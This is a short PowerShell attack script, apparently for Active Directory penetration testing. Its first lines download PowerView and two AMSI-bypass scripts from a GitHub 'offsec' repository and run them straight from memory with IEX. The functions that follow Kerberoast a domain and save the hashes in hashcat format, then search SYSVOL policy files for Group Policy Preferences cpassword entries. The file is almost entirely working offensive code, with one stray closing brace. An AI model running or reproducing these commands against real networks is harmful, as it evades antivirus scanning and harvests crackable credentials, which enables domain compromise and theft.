$currentPath = Get-Location
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/PowerView.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/amsibypass1.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/amsibypass2.ps1')

function Kerberoast{
    param($Domain)
    Invoke-Kerberoast -Domain $Domain -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII -FilePath "$currentPath\hashes.kerberoast"
    if (-not (Test-Path "$currentPath\Kerberoasting")) {
        New-Item -ItemType Directory -Path "$currentPath\Kerberoasting"
    }
    Move-Item "$currentPath\hashes.kerberoast" -Destination "$currentPath\Kerberoasting" -Force
}
}


function SysvolCredFinds{
    param($Domain)
    findstr /S /I cpassword \\$Domain\sysvol\$Domain\policies\*.xml 
}
